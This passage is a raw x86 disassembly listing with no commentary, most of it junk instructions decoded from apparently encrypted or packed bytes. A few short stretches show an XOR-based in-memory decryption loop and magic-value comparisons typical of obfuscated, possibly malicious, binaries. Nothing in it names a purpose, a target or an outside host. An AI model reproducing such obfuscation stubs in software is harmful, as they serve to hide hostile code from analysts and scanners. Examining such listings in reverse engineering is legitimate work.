  402839:	shl    BYTE PTR [esi+0x33a9e4ed],cl
  40283f:	fdiv   DWORD PTR [ebx+eax*8-0x5b880879]
  402846:	(bad)  
  402847:	sbb    al,0x57
  402849:	outs   dx,DWORD PTR ds:[esi]
  40284a:	xchg   DWORD PTR [esi-0x15],ebx
  40284d:	scas   al,BYTE PTR es:[edi]
  40284e:	icebp  
  40284f:	stos   DWORD PTR es:[edi],eax
  402850:	xchg   esp,eax
  402851:	loope  0x4027d4
  402853:	or     BYTE PTR [esi-0x389f8ae4],bl
  402859:	add    eax,0x42e8de
  40285e:	adc    al,0x0
  402860:	add    BYTE PTR [eax],al
  402862:	cmp    DWORD PTR ds:0x42e8de,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e8de,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42eb58
  402885:	cmp    DWORD PTR ds:0x42e8de,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e8de
  40289a:	dec    eax
  40289b:	mov    ds:0x42e8de,eax
  4028a0:	mov    eax,ds:0x42e8de
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e8de,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	idiv   DWORD PTR [edx]
  4028e2:	loop   0x402926
  4028e4:	out    0x3,al
  4028e6:	jle    0x402966
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	data16 mov WORD PTR [ebp-0xf],ds
  4028f0:	and    DWORD PTR [edi],esi
  4028f2:	sub    eax,0x68369e0a
  4028f7:	xchg   ecx,eax
  4028f8:	push   ecx
  4028f9:	xor    ch,BYTE PTR [ebp+0x76]
  4028fc:	mov    ecx,edx
  4028fe:	dec    edx
  4028ff:	cmp    al,0xd8
  402901:	pop    es
  402902:	fbstp  TBYTE PTR [edi]
  402904:	cmp    al,0x34
  402906:	shl    BYTE PTR [ecx-0x64674430],cl
  40290c:	sbb    ch,ah
  40290e:	ja     0x402891
  402910:	arpl   WORD PTR [esi+0x7921c600],bp
  402916:	ret    
  402917:	inc    esp
  402918:	pop    edi
  402919:	mov    cl,0xb6
  40291b:	fidiv  WORD PTR [ebp-0xe490c70]
  402921:	xchg   edx,eax
  402922:	mov    WORD PTR [edi-0x730804f4],es
  402928:	adc    BYTE PTR [eax+0x40],bl
  40292b:	(bad)  
  40292c:	push   ecx
  40292d:	pop    ecx
  40292e:	xchg   edx,eax
  40292f:	push   edx
  402930:	out    0xf,al
  402932:	pop    eax
  402933:	push   esi
  402934:	sub    cl,BYTE PTR [ebp-0x6b]
  402937:	popf   
  402938:	mov    ecx,0x33dd328e
  40293d:	sbb    BYTE PTR [ecx+eax*1],cl
  402940:	and    al,0xf2
  402942:	out    dx,eax
  402943:	or     al,0xa
  402945:	daa    
  402946:	jne    0x40297c
  402948:	sbb    al,0x94
  40294a:	(bad)  
  40294b:	mov    edi,0xa2f550e3
  402950:	push   esp
  402951:	sub    cl,ah
  402953:	mov    edx,0x29b949e3
  402958:	push   edi
  402959:	inc    BYTE PTR [eax+edx*8-0x1b7d04d8]
  402960:	mov    esp,0x902b6dd2
  402965:	imul   ebx,DWORD PTR [eax-0x74],0x7d
  402969:	hlt    
  40296a:	loopne 0x402983
  40296c:	cmp    DWORD PTR [eax*1-0x2b66bf76],ecx
  402973:	push   ebx
  402974:	fistp  DWORD PTR [eax]
  402976:	jo     0x40292f
  402978:	mov    eax,0x577f913f
  40297d:	call   0x57b5:0x1b077c23
  402984:	xor    edi,0xffffffee
  402987:	shr    BYTE PTR [eax-0x6d2d8d8c],cl
  40298d:	jg     0x4029f7
  40298f:	jo     0x402991
  402991:	jb     0x4029a5
  402993:	rcl    BYTE PTR [ecx+0x38eb0c71],1
  402999:	push   es
  40299a:	push   es
  40299b:	popa   
  40299c:	ins    DWORD PTR es:[edi],dx
  40299d:	jl     0x402968
  40299f:	les    edx,FWORD PTR [ebp+0x49]
  4029a2:	push   edx
  4029a3:	dec    eax
  4029a4:	les    ebx,FWORD PTR [ecx]
  4029a6:	mov    bh,0x88
  4029a8:	mov    DWORD PTR [eax],ecx
  4029aa:	test   al,0x88
  4029ac:	ja     0x4029cc
  4029ae:	ret    
  4029af:	aam    0x1f
  4029b1:	mov    eax,0xc5e7888a
  4029b6:	xor    al,BYTE PTR es:[eax+0x78430755]
  4029bd:	in     eax,0xe
  4029bf:	cmp    al,0x13
  4029c1:	and    ebx,DWORD PTR [eax+0x109436f9]
  4029c7:	dec    esp
  4029c8:	xchg   edi,eax
  4029c9:	rol    BYTE PTR [edi],1
  4029cb:	inc    ecx
  4029cc:	setnp  bh
  4029cf:	jno    0x4029cc
  4029d1:	jmp    0x40298e
  4029d3:	pop    ecx
  4029d4:	fbld   TBYTE PTR [ebp+0x71569ea7]
  4029da:	(bad)  [eax+0x25]
  4029dd:	dec    esp
  4029de:	retf   
  4029df:	shr    DWORD PTR [esi],cl
  4029e1:	js     0x4029e1
  4029e3:	retf   0x277d
  4029e6:	or     al,0xe4
  4029e8:	addr16 cmp dh,bh
  4029eb:	idiv   DWORD PTR [edi+0x67f7387]
  4029f1:	sub    DWORD PTR [edx-0x58e02a7a],esp
  4029f7:	xor    eax,0x1e27a287
  4029fc:	lock inc ebx
  4029fe:	dec    edx
  4029ff:	out    dx,al
  402a00:	outs   dx,BYTE PTR ds:[esi]
  402a01:	popa   
  402a02:	xchg   ebx,eax
  402a03:	imul   ecx,DWORD PTR [eax-0x4c],0xf56c6b88
  402a0a:	mov    ebx,0x74ae0e1d
  402a0f:	xchg   DWORD PTR ds:0xce307833,eax
  402a15:	or     cl,ah
  402a17:	pop    edi
  402a18:	data16 je 0x402a7c
  402a1b:	xchg   ecx,eax
  402a1c:	pop    esp
  402a1d:	mov    esp,0x8c55c6dc
  402a22:	aad    0x34
  402a24:	and    ah,al
  402a26:	hlt    
  402a27:	in     eax,dx
  402a28:	mov    ecx,0x75ecd63
  402a2d:	xor    ch,BYTE PTR cs:[esi+0x558a94df]
  402a34:	in     al,0x46
  402a36:	icebp  
  402a37:	fucom  st(3)
  402a39:	xchg   DWORD PTR [ebx+0x1d],edi
  402a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a3d:	cmp    al,0xab
  402a3f:	ins    DWORD PTR es:[edi],dx
  402a40:	mov    edi,0x8e71970
  402a45:	out    dx,al
  402a46:	mov    eax,0x2ee8bbc4
  402a4b:	push   eax
  402a4c:	sub    edx,ebp
  402a4e:	or     al,0xad
  402a50:	popf   
  402a51:	jo     0x402a54
  402a53:	adc    esi,DWORD PTR [eax+ecx*4-0x75]
  402a57:	(bad)
  402a5a:	clc    
  402a5b:	pop    ds
  402a5c:	(bad)  
  402a5d:	popa   
  402a5e:	and    dl,ah
  402a60:	mov    esp,0xab76286e
  402a65:	nop
  402a66:	test   BYTE PTR [edx],0xa6
  402a69:	ss cs pop edi
  402a6c:	adc    ebp,DWORD PTR [edi+0x3e46163d]
  402a72:	dec    esi
  402a73:	cmc    
  402a74:	mov    cl,0x96
  402a76:	lahf   
  402a77:	out    0xf2,al
  402a79:	jmp    0x402ab6
  402a7b:	or     eax,0xb61d0fc5
  402a80:	inc    edi
  402a81:	jno    0x402a23
  402a83:	pop    ebx
  402a84:	mov    BYTE PTR [ecx-0xcf52f0e],dh
  402a8a:	cmp    cl,al
  402a8c:	dec    edi
  402a8d:	inc    ebp
  402a8e:	mov    ds:0xda102781,eax
  402a93:	(bad)  
  402a94:	aas    
  402a95:	sub    al,0x3
  402a97:	fld    st(7)
  402a99:	shl    DWORD PTR [esi-0x25ee7503],cl
  402a9f:	xchg   ebx,eax
  402aa0:	pop    eax
  402aa1:	cmp    eax,0x4af2f169
  402aa6:	(bad)  
  402aa7:	sub    al,0xf1
  402aa9:	pop    eax
  402aaa:	sub    DWORD PTR [ebx+ecx*1],0x10
  402aae:	cwde   
  402aaf:	pop    es
  402ab0:	xchg   BYTE PTR [esi+0x61],ah
  402ab3:	dec    edx
  402ab4:	mov    ah,0x88
  402ab6:	jle    0x402b2b
  402ab8:	push   cs
  402ab9:	jg     0x402a91
  402abb:	mov    edx,0x847a3f84
  402ac0:	(bad)  
  402ac1:	sub    DWORD PTR [eax],ecx
  402ac3:	adc    dh,bl
  402ac5:	addr16 add dh,al
  402ac8:	lock inc esi
  402aca:	loope  0x402a92
  402acc:	xor    bh,BYTE PTR [ebx+0x5354b77]
  402ad2:	pop    edi
  402ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ad4:	xchg   edi,eax
  402ad5:	cmp    ecx,DWORD PTR [eax+0x360dfbdc]
  402adb:	xchg   ebp,eax
  402adc:	dec    ebx
  402add:	jns    0x402a8e
  402adf:	push   ebx
  402ae0:	(bad)  
  402ae2:	dec    esi
  402ae3:	retf   0xe041
  402ae6:	xchg   edx,eax
  402ae7:	ins    DWORD PTR es:[edi],dx
  402ae8:	fidiv  DWORD PTR [eax+0x23]
  402aeb:	adc    DWORD PTR [ecx+0x4d],esp
  402aee:	cwde   
  402aef:	inc    ecx
  402af0:	pop    ebp
  402af1:	cdq    
  402af2:	dec    esp
  402af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af4:	(bad)  
  402af5:	cwde   
  402af6:	imul   edx,DWORD PTR [ebx],0xbcd328a0
  402afc:	test   al,0x9e
  402afe:	cmp    esp,DWORD PTR [eax]
  402b00:	inc    esp
  402b01:	xchg   ebp,eax
  402b02:	in     al,dx
  402b03:	inc    ebp
  402b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b05:	dec    ebx
  402b06:	mov    al,ds:0x3bddb7ab
  402b0b:	(bad)  
  402b0c:	(bad)  [ebp-0x73a50216]
  402b12:	mov    al,ds:0x92089e95
  402b17:	fcomp  QWORD PTR [esi-0x1448c625]
  402b1d:	add    BYTE PTR [edi-0xe],0xcc
  402b21:	jg     0x402b99
  402b23:	xor    BYTE PTR [ebp+0x236e2543],ah
  402b29:	inc    edi
  402b2a:	pop    ss
  402b2b:	test   BYTE PTR [eax],ah
  402b2d:	(bad)  
  402b2e:	xchg   edi,eax
  402b2f:	(bad)  
  402b30:	fistp  QWORD PTR [edi-0x1f15264b]
  402b36:	inc    esp
  402b37:	enter  0x8e0f,0x81
  402b3b:	mov    ds:0x7b8408b8,eax
  402b40:	or     esi,DWORD PTR [ebx]
  402b42:	mov    dl,0xf5
  402b45:	stc    
  402b46:	push   ds
  402b47:	add    eax,DWORD PTR [esi]
  402b49:	imul   edx,ebx,0xd23cc241
  402b4f:	in     eax,dx
  402b50:	mov    bh,BYTE PTR [edx]
  402b52:	hlt    
  402b53:	inc    edx
  402b54:	loopne 0x402afe
  402b56:	dec    edi
  402b57:	mov    ah,0xf3
  402b59:	fisttp QWORD PTR [edx]
  402b5b:	in     al,0x12
  402b5d:	leave  
  402b5e:	dec    ebx
  402b5f:	add    eax,0xe5beea27
  402b64:	out    dx,eax
  402b65:	pop    ebp
  402b66:	cld    
  402b67:	in     al,0xc8
  402b69:	stos   DWORD PTR es:[edi],eax
  402b6a:	in     eax,0x1d
  402b6c:	js     0x402b4b
  402b6e:	xchg   esp,eax
  402b6f:	repz pushf 
  402b71:	bound  eax,QWORD PTR [esi+0x683b919c]
  402b77:	test   DWORD PTR [eax+edx*2+0x6b],esp
  402b7b:	in     al,0x26
  402b7d:	push   ss
  402b7e:	popa   
  402b7f:	pop    edi
  402b80:	pusha  
  402b81:	add    esp,DWORD PTR [ecx+0x57]
  402b84:	cli    
  402b85:	ins    BYTE PTR es:[edi],dx
  402b86:	hlt    
  402b87:	xor    ebx,DWORD PTR [edi+0x37bec9e2]
  402b8d:	or     al,0x7f
  402b8f:	push   esp
  402b90:	add    ah,BYTE PTR [eax-0x28e669e0]
  402b96:	push   edx
  402b97:	pop    ebp
  402b98:	jl     0x402b48
  402b9a:	adc    ah,BYTE PTR ds:0x58e4bff7
  402ba0:	inc    ebp
  402ba1:	add    BYTE PTR [edi],0xd
  402ba4:	push   0xffffffa7
  402ba6:	inc    esi
  402ba7:	call   0x1914:0x7f849577
  402bae:	xchg   esp,eax
  402baf:	cmp    DWORD PTR [ebx+0x15],edi
  402bb2:	sub    DWORD PTR [ebp-0x11d11fcf],0x2cf2c29b
  402bbc:	ja     0x402c39
  402bbe:	dec    ebp
  402bbf:	mov    edx,0x98a74ffa
  402bc4:	aas    
  402bc5:	fstp   QWORD PTR [ecx]
  402bc7:	mov    DWORD PTR [ebx+ecx*8-0x5b],ecx
  402bcb:	int    0x5e
  402bcd:	das    
  402bce:	jl     0x402bfa
  402bd0:	adc    al,0x7d
  402bd2:	pop    ds
  402bd3:	mov    esi,0xa62d8d30
  402bd8:	call   DWORD PTR [ebx+eiz*1]
  402bdb:	popf   
  402bdc:	cs shr esp,1
  402bdf:	test   al,0x19
  402be1:	in     eax,0x8d
  402be3:	imul   edi,DWORD PTR [eax-0x52],0xfffffff4
  402be7:	pop    ebx
  402be8:	fstp   DWORD PTR [eax+0x4a591c92]
  402bee:	ins    BYTE PTR es:[edi],dx
  402bef:	jmp    FWORD PTR [ebp-0x7e07db2b]
  402bf5:	mov    ah,0xe1
  402bf7:	jb     0x402c4c
  402bf9:	inc    ecx
  402bfa:	and    cl,BYTE PTR [eax]
  402bfc:	mov    bl,0x23
  402bfe:	push   0x64
  402c00:	stc    
  402c01:	jae    0x402c33
  402c03:	jmp    0xf327:0xbd3055aa
  402c0a:	adc    edx,eax
  402c0c:	pop    ss
  402c0d:	add    DWORD PTR [ebp+0x47],ebp
  402c10:	and    al,BYTE PTR [eax-0x7e]
  402c13:	int    0x73
  402c15:	mov    edi,ecx
  402c17:	(bad)  
  402c19:	and    esp,DWORD PTR [eax+0x39]
  402c1c:	push   edx
  402c1d:	or     cl,cl
  402c1f:	stos   DWORD PTR es:[edi],eax
  402c20:	int3   
  402c21:	adc    BYTE PTR [eax],al
  402c23:	mov    ds:0xf622a420,eax
  402c28:	jne    0x402c15
  402c2a:	jne    0x402c5d
  402c2c:	sbb    eax,0x22c51a80
  402c31:	push   ebx
  402c32:	mul    DWORD PTR [ecx+0x1e]
  402c35:	rcl    DWORD PTR [eax],1
  402c37:	rol    BYTE PTR [ecx],cl
  402c39:	cmp    DWORD PTR ds:0xa121788c,esp
  402c3f:	inc    ebp
  402c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c41:	sahf   
  402c42:	xor    al,0x79
  402c44:	ss jl  0x402c8b
  402c47:	sbb    al,0xce
  402c49:	mov    dh,0xc4
  402c4b:	scas   eax,DWORD PTR es:[edi]
  402c4c:	push   0x8de7240c
  402c51:	sbb    eax,0x6c1eb940
  402c56:	push   cs
  402c57:	dec    ebp
  402c58:	fwait
  402c59:	(bad)  
  402c5a:	call   0x6cf5b93e
  402c5f:	xchg   ecx,eax
  402c60:	mov    ch,0x9b
  402c62:	cmp    eax,0xfcd73255
  402c67:	daa    
  402c68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c69:	repnz fwait
  402c6b:	mov    ebp,DWORD PTR [edi]
  402c6d:	inc    edi
  402c6e:	sub    DWORD PTR [edx-0x2d],edi
  402c71:	(bad)  
  402c73:	or     DWORD PTR [edi-0xc202b94],ecx
  402c79:	adc    BYTE PTR [edx-0x283c5cd7],bh
  402c7f:	scas   al,BYTE PTR es:[edi]
  402c80:	mov    eax,DWORD PTR [ebp-0x10]
  402c83:	and    DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	out    0x53,eax
  402cc2:	jmp    0x827e:0x7e070a97
  402cc9:	jno    0x402d49
  402ccb:	jle    0x402d44
  402ccd:	xor    BYTE PTR [ebx],cl
  402ccf:	push   es
  402cd0:	xchg   esp,eax
  402cd1:	adc    edi,eax
  402cd3:	(bad)  
  402cd5:	out    dx,eax
  402cd6:	ja     0x402d36
  402cd8:	jo     0x402c83
  402cda:	lds    ebp,FWORD PTR [ebx-0x4a]
  402cdd:	mov    WORD PTR [edi+0x18b8f3eb],?
  402ce3:	mov    DWORD PTR es:[esi],ebx
  402ce6:	mov    cl,0x8e
  402ce8:	push   edx
  402ce9:	repnz les esi,FWORD PTR [edx]
  402cec:	and    esi,DWORD PTR [esp+edi*1-0x5e]
  402cf0:	sar    BYTE PTR [ebp-0x3f536d2b],0x6a
  402cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cf8:	mov    bl,0xd1
  402cfa:	xchg   DWORD PTR [ebp+0x7d962d9f],ebx
  402d00:	pop    eax
  402d01:	je     0x402c86
  402d03:	adc    bl,BYTE PTR [eax+0x5d483a48]
  402d09:	xor    al,ch
  402d0b:	out    dx,eax
  402d0c:	cmp    eax,DWORD PTR [esp+ecx*4]
  402d0f:	mov    esi,ecx
  402d11:	mov    al,ds:0x678ef33e
  402d16:	ins    DWORD PTR es:[edi],dx
  402d17:	cmp    BYTE PTR [esi],bh
  402d19:	jae    0x402ca2
  402d1b:	mov    ecx,0xcdcc6b9c
  402d20:	fsub   DWORD PTR [ecx]
  402d22:	mov    WORD PTR [edi],cs
  402d24:	inc    eax
  402d25:	jecxz  0x402cf9
  402d27:	bound  edx,QWORD PTR [edi-0x4bd22b50]
  402d2d:	dec    eax
  402d2e:	pop    ecx
  402d2f:	arpl   sp,ax
  402d31:	loope  0x402d61
  402d33:	ret    0x5d24
  402d36:	cld    
  402d37:	mov    cl,0x7
  402d39:	fdiv   QWORD PTR [ebx]
  402d3b:	icebp  
  402d3c:	ds (bad) 
  402d3e:	cmovno ebx,DWORD PTR [ebp-0x3b43ec90]
  402d45:	inc    edx
  402d46:	iret   
  402d47:	ins    BYTE PTR es:[edi],dx
  402d48:	xchg   BYTE PTR [edi-0x56],bh
  402d4b:	rol    DWORD PTR [edi+0x6],cl
  402d4e:	xchg   BYTE PTR [esi-0x625c2632],bh
  402d54:	mov    esp,0x7537dbc8
  402d59:	outs   dx,BYTE PTR ds:[esi]
  402d5a:	adc    eax,0xe4882b60
  402d5f:	sub    DWORD PTR [ebx-0x14687433],0xffffffc6
  402d66:	pop    ebp
  402d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d68:	mov    ebx,0xc91f7155
  402d6d:	mov    DWORD PTR ds:0x9dac0f9e,esp
  402d73:	push   edi
  402d74:	push   edx
  402d75:	outs   dx,BYTE PTR ds:[esi]
  402d76:	xchg   ebx,eax
  402d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d78:	pop    edi
  402d79:	sbb    eax,0x1f175369
  402d7e:	pop    edi
  402d7f:	hlt    
  402d80:	sahf   
  402d81:	pop    ss
  402d82:	mov    al,0xb8
  402d84:	inc    ecx
  402d85:	ffreep st(5)
  402d87:	shl    BYTE PTR [edi+0x71b9db06],cl
  402d8d:	jg     0x402d18
  402d8f:	in     eax,dx
  402d90:	int    0xff
  402d92:	out    dx,al
  402d93:	addr16 or al,0x75
  402d96:	sbb    al,0x9
  402d98:	add    ecx,ebp
  402d9a:	sbb    ebx,ebp
  402d9c:	call   DWORD PTR [edi+0x55]
  402d9f:	jno    0x402dd9
  402da1:	enter  0xe876,0xd7
  402da5:	inc    eax
  402da6:	mov    al,0xff
  402da8:	or     DWORD PTR [edx+0x177fee1f],ecx
  402dae:	cmp    esi,ebp
  402db0:	(bad)  
  402db1:	jbe    0x402d8d
  402db3:	jns    0x402df1
  402db5:	shl    BYTE PTR [ebp+0x2f876b3c],1
  402dbb:	push   es
  402dbc:	or     esp,DWORD PTR [eax-0x6c552fa5]
  402dc2:	adc    al,0xa2
  402dc4:	sar    DWORD PTR [ecx-0x2b4608e4],cl
  402dca:	xchg   esi,eax
  402dcb:	cli    
  402dcc:	rcl    ecx,1
  402dce:	or     bl,bl
  402dd0:	push   0x45
  402dd2:	pop    es
  402dd3:	dec    eax
  402dd4:	sbb    ebx,0xaa4433cb
  402dda:	inc    edx
  402ddb:	sti    
  402ddc:	xlat   BYTE PTR ds:[ebx]
  402ddd:	cmp    dl,bh
  402ddf:	inc    ecx
  402de0:	ret    
  402de1:	xor    al,ah
  402de3:	sub    esp,ebx
  402de5:	and    DWORD PTR [eax+0x4d],0xb7d7f34f
  402dec:	ja     0x402d87
  402dee:	xchg   esp,eax
  402def:	dec    ebp
  402df0:	mov    cl,0xac
  402df2:	shl    DWORD PTR [ecx-0x207330ef],1
  402df8:	lahf   
  402df9:	mov    dh,0xb1
  402dfb:	push   ds
  402dfc:	mov    ebp,0xefb93895
  402e01:	pop    eax
  402e02:	xor    eax,0xbc17b23
  402e07:	adc    BYTE PTR [edi-0x19],ch
  402e0a:	lahf   
  402e0b:	jl     0x402e16
  402e0d:	daa    
  402e0e:	push   cs
  402e0f:	ror    dh,1
  402e11:	cmp    edx,DWORD PTR [ebx]
  402e13:	pop    esi
  402e14:	stc    
  402e15:	scas   al,BYTE PTR es:[edi]
  402e16:	shl    edx,1
  402e18:	fwait
  402e19:	sbb    eax,0x7a76b704
  402e1e:	addr16 add eax,0xa77f545b
  402e24:	pop    ebx
  402e25:	leave  
  402e26:	ss mov ebp,0x288500e4
  402e2c:	mov    ch,0xf0
  402e2e:	xlat   BYTE PTR ds:[ebx]
  402e2f:	jo     0x402df1
  402e31:	jmp    0x2890:0xb128a051
  402e38:	dec    ebp
  402e39:	push   eax
  402e3a:	mov    ds:0x3669eb35,eax
  402e3f:	out    dx,al
  402e40:	repz cmp bl,BYTE PTR [edx-0xd]
  402e44:	fnstenv [ebx]
  402e46:	adc    BYTE PTR [ebx],al
  402e48:	test   edi,ebp
  402e4a:	push   esp
  402e4b:	retf   
  402e4c:	in     al,dx
  402e4d:	push   esp
  402e4e:	lea    eax,[ebx+0x7be95aeb]
  402e54:	or     al,0xc0
  402e56:	not    BYTE PTR [edi-0x29d42dc4]
  402e5c:	call   0x5321:0xcf32a49a
  402e63:	cmp    ecx,esp
  402e65:	push   0xffffffdc
  402e67:	pop    edi
  402e68:	pop    esi
  402e69:	xchg   ebp,eax
  402e6a:	in     eax,dx
  402e6b:	mov    esp,DWORD PTR [ebx]
  402e6d:	arpl   WORD PTR [ebx],cx
  402e6f:	aaa    
  402e70:	stc    
  402e71:	mov    edx,0x198e16a6
  402e76:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e78:	push   es
  402e79:	jge    0x402e3a
  402e7b:	jmp    0x9dc:0xa906f04a
  402e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e83:	sub    eax,0x3f7e130b
  402e88:	xchg   esi,eax
  402e89:	jns    0x402e26
  402e8b:	or     BYTE PTR [eax+0x68e0419c],dh
  402e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e92:	xor    eax,0xc9c00c9e
  402e97:	imul   ebp,DWORD PTR [edi-0x30a2e77a],0xffffffa8
  402e9e:	add    al,0x65
  402ea0:	cmp    DWORD PTR [ecx+0x400f2454],esi
  402ea6:	sub    BYTE PTR [esi-0x113692b6],bl
  402eac:	mov    esp,0xa0373542
  402eb1:	addr16 xor al,0x10
  402eb4:	nop
  402eb5:	in     al,0x61
  402eb7:	add    al,bl
  402eb9:	out    0xc6,al
  402ebb:	int3   
  402ebc:	cli    
  402ebd:	or     cl,BYTE PTR [eax-0x741b142]
  402ec3:	mov    eax,0x4021a064
  402ec8:	add    DWORD PTR [edx+0x26],ebx
  402ecb:	es int 0xf4
  402ece:	add    dl,BYTE PTR [esi+0x5a]
  402ed1:	xor    BYTE PTR [ecx-0x39],cl
  402ed4:	mov    ebx,0xa5280c2
  402ed9:	mov    cl,0x99
  402edb:	mov    ebx,0xf853562
  402ee0:	or     BYTE PTR [ecx-0x7eda5730],dh
  402ee6:	fcom   DWORD PTR [esi+eiz*2+0x18]
  402eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eeb:	jno    0x402ea6
  402eed:	sbb    esp,DWORD PTR [edi-0x66]
  402ef0:	and    ah,BYTE PTR [esp+ebx*4+0x1a]
  402ef4:	add    DWORD PTR [ebx+0x7d],0xffffff85
  402ef8:	jecxz  0x402f38
  402efa:	pop    edi
  402efb:	mov    ch,al
  402efd:	pop    ecx
  402efe:	dec    ebp
  402eff:	adc    ebp,0xb669d5f2
  402f05:	pop    ss
  402f06:	jno    0x402eeb
  402f08:	and    ebx,DWORD PTR [esp+edx*1]
  402f0b:	mov    eax,0xd6eb5bb7
  402f10:	fsubrp st(1),st
  402f12:	sub    eax,0x7b4e21f1
  402f17:	adc    ebp,DWORD PTR [ecx]
  402f19:	fmul   DWORD PTR [esi-0x4d]
  402f1c:	mov    ebp,esi
  402f1e:	nop
  402f1f:	dec    ebx
  402f20:	xor    al,0x51
  402f22:	add    BYTE PTR [ebx-0x7e],dh
  402f25:	mov    eax,ds:0x9d7a0aad
  402f2a:	lods   al,BYTE PTR ds:[esi]
  402f2b:	xchg   edx,eax
  402f2c:	xor    DWORD PTR [eax-0x32],ebx
  402f2f:	jge    0x402f66
  402f31:	sbb    al,0xdd
  402f33:	fldenv [esi+ebp*8]
  402f36:	pop    esi
  402f37:	pop    edi
  402f38:	add    ebx,DWORD PTR [esi+0x7c209ac]
  402f3e:	test   al,0xa0
  402f40:	jmp    0x5f734497
  402f45:	scas   al,BYTE PTR es:[edi]
  402f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f47:	push   esi
  402f48:	or     ch,BYTE PTR [ebp-0x12]
  402f4b:	sbb    al,0xda
  402f4d:	in     eax,0xcc
  402f4f:	mov    ebx,DWORD PTR [edx]
  402f51:	mov    ds,WORD PTR [ebp-0x2fa4ca6d]
  402f57:	push   ss
  402f58:	lods   al,BYTE PTR ds:[esi]
  402f59:	outs   dx,DWORD PTR ds:[esi]
  402f5a:	aas    
  402f5b:	outs   dx,BYTE PTR ds:[esi]
  402f5c:	fwait
  402f5d:	dec    esp
  402f5e:	call   FWORD PTR [ebx+0x3a]
  402f61:	inc    edi
  402f62:	dec    esp
  402f63:	jmp    0x402f07
  402f65:	sub    ecx,DWORD PTR [esi+edx*4+0xd]
  402f69:	jl     0x402f26
  402f6b:	sub    DWORD PTR [edx-0x4c],ebp
  402f6e:	xchg   BYTE PTR [edx+ebx*1],dh
  402f71:	ds loopne 0x402f37
  402f74:	rcr    BYTE PTR [ecx+0x34],cl
  402f77:	push   eax
  402f78:	add    al,0xc
  402f7a:	hlt    
  402f7b:	adc    al,0x22
  402f7d:	push   edx
  402f7e:	cmp    eax,0x77db2688
  402f83:	mov    esi,0x1861a49b
  402f88:	test   BYTE PTR [ebx-0x5f],ch
  402f8b:	push   ss
  402f8c:	shl    DWORD PTR [ebp-0x52],1
  402f8f:	mov    dl,0xb1
  402f91:	cmp    dl,BYTE PTR [ebp-0x33]
  402f94:	mov    edi,0x7e17cebc
  402f99:	or     DWORD PTR [ecx-0x78cbfefe],0xa728dbe5
  402fa3:	aas    
  402fa4:	imul   esi,esp,0x8017f084
  402faa:	dec    ebx
  402fab:	js     0x402f3e
  402fad:	rcr    BYTE PTR [esi+eiz*8-0x6b],0x3f
  402fb2:	or     eax,0x410df7cb
  402fb7:	nop
  402fb8:	cmp    cl,BYTE PTR [esi]
  402fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fbb:	jle    0x402f74
  402fbd:	jp     0x402f69
  402fbf:	rcr    BYTE PTR [edi-0x60152ad8],1
  402fc5:	dec    esi
  402fc6:	lock jns 0x402f9c
  402fc9:	jns    0x402ff4
  402fcb:	pop    edi
  402fcc:	jbe    0x402fbb
  402fce:	mov    cl,0x34
  402fd0:	sets   cl
  402fd3:	std    
  402fd4:	mov    ebp,0xcf989600
  402fd9:	sub    dh,ch
  402fdb:	adc    BYTE PTR [ecx],dl
  402fdd:	aam    0x8d
  402fdf:	mov    cl,0x7c
  402fe1:	adc    DWORD PTR [edi-0x5e],ebx
  402fe4:	jecxz  0x402fe1
  402fe6:	mov    cl,0x7b
  402fe8:	cmp    eax,0xc62099df
  402fed:	jge    0x40303a
  402fef:	(bad)  
  402ff0:	shr    BYTE PTR [edx],cl
  402ff2:	inc    ebp
  402ff3:	inc    ebp
  402ff4:	push   esp
  402ff5:	addr16 pop es
  402ff7:	fucom  st(6)
  402ff9:	lea    ecx,[esi]
  402ffb:	jecxz  0x402ff4
